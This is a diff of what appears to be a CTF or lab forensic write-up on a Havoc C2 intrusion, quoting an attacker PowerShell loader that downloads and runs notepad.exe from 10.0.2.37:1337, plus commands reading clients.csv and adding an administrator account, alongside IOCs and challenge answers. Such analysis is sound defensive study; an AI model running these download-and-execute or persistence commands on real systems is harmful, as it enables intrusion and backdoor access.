@@ -1,6 +1,6 @@
 - **install.ps1**
 
-![](../../Image/Pasted%20image%2020250423105618.png)
+![Pasted image 20250422211550.png](Pasted%20image%2020250422211550.png)
 
 ```
 $aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";
@@ -9,14 +9,13 @@ Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;
 $65lmAtnzW8 = New-ObjectSystem.Net.WebClient;$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);
 Start-Process -Filepath $LA4rJgSPpx
 ```
-
 - **Object list:**
 
-![](../../Image/Pasted%20image%2020250423105656.png)
+![Pasted image 20250422205617.png](Pasted%20image%2020250422205617.png)
 
 - **notepad.exe**
 
-![](../../Image/Pasted%20image%2020250423105643.png)
+![Pasted image 20250422214535.png](Pasted%20image%2020250422214535.png)
 
 - **Havoc Artifact** from network traffic
 ```
@@ -30,9 +29,9 @@ Start-Process -Filepath $LA4rJgSPpx
     [-] IV: 8cd00c3e349290565aaa5a8c3aacd430
 ```
 ## IOCs
-#### **IP Address**
+#### **IP Address:**
 - hxxp[:]//10.0.2.37
-#### **File**
+#### **File:**
 - /install.ps1
 - /notepad.exe
 - /notepad.exe
@@ -42,21 +41,22 @@ Start-Process -Filepath $LA4rJgSPpx
 
 - What is the SID of the user that the attacker is executing everything under?
 
-![](../../Image/Pasted%20image%2020250423101528.png)
+![Pasted image 20250422234306.png](Pasted%20image%2020250422234306.png)
 
 - What is the Link-local IPv6 Address of the server? Enter the answer exactly as you see it.
 
-![](../../Image/Pasted%20image%2020250423105228.png)
+![Pasted image 20250422232038.png](Pasted%20image%2020250422232038.png)
 
 => **fe80::e134:1b0c:c8d5:3020%6**
 
 - The attacker printed a flag for us to see. What is that flag?
 
-![](../../Image/Pasted%20image%2020250423105244.png)
+![Pasted image 20250422232647.png](Pasted%20image%2020250422232647.png)
 
 - The attacker added a new account as a persistence mechanism. What is the username and password of that account? Format is **username:password** 
 
-![](../../Image/Pasted%20image%2020250423105304.png)
+![Pasted image 20250422225827.png](Pasted%20image%2020250422225827.png)
+
 ```
 dir C:\Users\paco\Desktop\
 type C:\Users\paco\Desktop\Files\clients.csv
@@ -66,13 +66,13 @@ net user administrator WfD3hz3AXZ4n /add
 
 - The attacker found an important file on the server. What is the full path of that file?
 
-![](../../Image/Pasted%20image%2020250423105347.png)
+![Pasted image 20250422232845.png](Pasted%20image%2020250422232845.png)
 
 => **C:\Users\paco\Desktop\Files\clients.csv**
 
 - What is the flag found inside the file from question 5?
 
-![](../../Image/Pasted%20image%2020250423105335.png)
+![Pasted image 20250422232446.png](Pasted%20image%2020250422232446.png)
 
 => **C:\Users\paco\Desktop\Files\clients.csv**
 
